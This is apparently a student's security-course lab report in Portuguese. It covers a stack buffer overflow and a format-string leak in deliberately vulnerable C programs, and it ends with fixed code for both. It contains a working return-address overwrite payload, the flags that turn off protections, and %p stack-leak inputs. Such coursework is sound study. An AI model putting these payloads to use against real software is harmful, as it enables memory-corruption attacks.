
## Parte A

## 1)

```-fno-stack-protector ```

Desativa o stack canary (proteção contra buffer overflow).
- Sem esta flag, o compilador insere valores de controlo na stack para detetar alterações ma>
- Com esta flag, torna-se possível sobrescrever o endereço de retorno sem deteção.

```-z execstack```

Marca a stack como executável.
- Por defeito, a stack não permite execução de código (proteção NX).
- Com esta flag, é possível executar shellcode diretamente na stack.

```-no-pie```

Desativa Position Independent Executable (PIE).
- O programa passa a ter endereços fixos em memória.
- Isto facilita ataques, pois funções como secret_function ficam sempre no mesmo endereço.

```-g```

Inclui informação de debug no binário.
- Permite analisar o programa com ferramentas como o GDB.
- Não é uma mitigação, mas ajuda na exploração.

## 2) 
Endereço buffer na stack: 0x7fffffffe150
Endereço do return adress: 0x7fffffffe198
Diferença Bytes: 72 bytes
Endereço secret_function: 0x4011b6

## 3) 
```bash
./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
```
![[Pasted image 20260420151815.png]]


## 4) 

```bash
gcc -o vuln vuln.c -z execstack -no-pie -g
```
goncalo@ssi:~/Guiao9$ ./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
-bash: warning: command substitution: ignored null byte in input
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffdccaddc30
[*] secret_function is at: 0x4011d6
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
*** stack smashing detected ***: terminated
Aborted


A flag `-fno-stack-protector` **não foi usada**, logo o **stack canary está ativo**.  
- Quando o buffer overflow ocorre, o canary é alterado.  
- O programa deteta a corrupção antes do `return` e termina.

---
```bash
gcc -o vuln vuln.c -fno-stack-protector -z execstack -g
```
goncalo@ssi:~/Guiao9$ ./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
-bash: warning: command substitution: ignored null byte in input
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffdfdc62890
[*] secret_function is at: 0x589cb4e8e1c9
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
Segmentation fault

Aqui o stack protector está desativado, **mas o PIE está ativo** (não usaste `-no-pie`).  
- O endereço da `secret_function` muda a cada execução (ASLR).  
- O endereço usado no payload está errado → salto para endereço inválido → crash.

---
```bash
gcc -o vuln vuln.c -g
```

goncalo@ssi:~/Guiao9$ ./vuln $(python3 -c "import sys; sys.stdout.buffer.write(b'A'*72 + b'\xb6\x11\x40\x00\x00\x00\x00\x00')")
-bash: warning: command substitution: ignored null byte in input
[*] process_input return address is on the stack.
[*] Buffer is at:         0x7ffff39275d0
[*] secret_function is at: 0x610e69d801e9
[*] You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@
*** stack smashing detected ***: terminated
Aborted

Todas as proteções estão ativas: Stack canary; PIE (ASLR); NX (stack não executável)
- O overflow altera o canary → programa aborta antes de usar o return address.

## 5)
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void secret_function(void) {
    printf("\n[!] ACCESS GRANTED: you reached the secret function!\n");
    printf("[!] In a real exploit, this could be arbitrary code execution.\n\n");
    exit(0);
}

void process_input(char *input) {
    char buffer[64];

    printf("[*] Buffer is at:         %p\n", (void *)buffer);
    printf("[*] secret_function is at: %p\n", (void *)secret_function);

    // Verificação explícita de tamanho
    if (strlen(input) >= sizeof(buffer)) {
        fprintf(stderr, "[!] Error: input too large!\n");
        exit(1);
    }

    // Cópia segura
    strncpy(buffer, input, sizeof(buffer) - 1);
    buffer[sizeof(buffer) - 1] = '\0'; // garantir null-termination

    printf("[*] You entered: %s\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <input>\n", argv[0]);
        return 1;
    }

    printf("[*] process_input return address is on the stack.\n");
    process_input(argv[1]);
    printf("[*] Normal programme termination.\n");

    return 0;
}
```

- A substituição de `strcpy` por `strncpy`: evita cópia ilimitada e restringe ao tamanho do buffer.
- Verificação de comprimento (`strlen`): impede inputs maiores que o buffer antes da cópia.
- Null-termination manual: garante string válida mesmo em "edge case".
-  Por fim ativa-se as mitigações do compilador: protegem contra exploração (stack canary, ASLR, NX) - Flags ativas por defeito, compilar com `gcc -o vuln vuln.c -g`.

## Parte B

## 6)
```bash
gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security

fmtvuln.c: In function ‘process_input’:
fmtvuln.c:10:5: warning: format not a string literal and no format arguments [-Wformat-security]
   10 |     printf(input);             /* CWE-134: user input used as format string */
```

O input do utilizador está a ser usado como "formatted string", ou seja:
- O utilizador pode inserir format specifiers (`%x`, `%s`, `%n`)
- Pode ler ou escrever memória arbitrária
Os warnings do compilador são úteis para identificar potenciais vulnerabilidades cedo, mas não substituem validação de input, boas práticas (ex: `printf("%s", input)`), testes de segurança...

## 7)
```bash
./fmtvuln "%p %p %p %p %p %p %p %p %p %p"
[*] Address of secret on stack: 0x7ffca7704cd0
[*] Processing input...
0x56cf608f52a0 (nil) 0x7980c431c5a4 0x7980c4403b20 0x410 (nil) 0x7ffca7705595 0xcafebabe 0x6fce288a89f2ef00 0x7ffca7704d00
[*] Normal programme termination.
```

O ouput está a imprimir os valores dos enderços que estão na stack, sendo um deles o valor de `secret = 0x7ffca7704cd0`. O programa está a ter um comportamento que não o esperado, dando asas a um "stack leak".

A função printf é uma função **variádica** (aceita número variável de argumentos): interpreta a format string (`input`) e, para cada especificador (`%p`, `%x`, etc.), tenta ler um argumento da stack. Neste caso não foram passados argumentos adicionais, mas o `printf` não tem forma de verificar isso, então vai ler valores diretamente da stack como se fossem argumentos válidos - esses valores correspondem a dados locais (como `secret`)

```bash
./fmtvuln "%x %x %x %x %x %x %x %x %x %x"
[*] Address of secret on stack: 0x7ffec889dff0
[*] Processing input...
882812a0 0 d111c5a4 d1203b20 410 0 c889f595 cafebabe 87b57000 c889e020
[*] Normal programme termination.
```
- `%x` imprime valores em **hexadecimal (32 bits)**
- `%p` imprime **endereços completos (64 bits)**

Em sistemas 64 bits:
- `%x` → mostra apenas parte do valor (truncado)
- `%p` → mostra o endereço completo

## 8)

```bash
./fmtvuln "$(python3 -c "print('%p ' * 30, end='')")"
[*] Address of secret on stack: 0x7ffe59ba37d0
[*] Processing input...
0x63c3e72622a0 (nil) 0x7de7c491c5a4 0x7de7c4a03b20 0x410 (nil) 0x7ffe59ba5558 !!!0xcafebabe!!! 0x2929f520db458600 0x7ffe59ba3800 0x63c3e47b12a5 0x7ffe59ba3928 0x259ba3928 0x7ffe59ba38a0 0x7de7c482a1ca 0x7ffe59ba3850 0x7ffe59ba3928 0x2e47b0040 0x63c3e47b124d 0x7ffe59ba3928 0xde5cf0c5cf8540b5 0x2 (nil) 0x63c3e47b3da0 0x7de7c4b03000 0xde5cf0c5cee540b5 0xda6fcab4fdc740b5 0x7ffe00000000 (nil) (nil) 
[*] Normal programme termination.
```
 O valor sentinela aparece na 8ª posição (marcado com !!!).
 Este exercício demonstra que vulnerabilidades de **format string (CWE-134)** permitem:
 - Divulgação de informação (Information Disclosure)

Um atacante pode ler valores arbitrários da stack e obter variáveis locais (ex: `secret`), endereços de memória (ASLR bypass), ponteiros e dados internos. Neste exemplo a zona de memória afetada é a stack do processo, mas pode ser estendida

## 9)

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void process_input(char *input) {
    unsigned long secret = 0xcafebabe;   /* a sensitive value resident on the stack */

    printf("[*] Address of secret on stack: %p\n", (void *)&secret);
    printf("[*] Processing input...\n");
    printf("%s", input);   /* CORREÇÃO */
    printf("\n");
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "Usage: %s <input>\n", argv[0]);
        return 1;
    }
    process_input(argv[1]);
    printf("[*] Normal programme termination.\n");
    return 0;
}
```

Já não se verifica o problema do Exercício 7:

```bash
./fmtvuln "%p %p %p %p %p %p %p %p %p %p"
[*] Address of secret on stack: 0x7ffec2a8cca0
[*] Processing input...
%p %p %p %p %p %p %p %p %p %p
[*] Normal programme termination.
```

A compilação com `gcc -o fmtvuln fmtvuln.c -g -Wall -Wformat -Wformat-security` já não produz nenhum warning de segurança!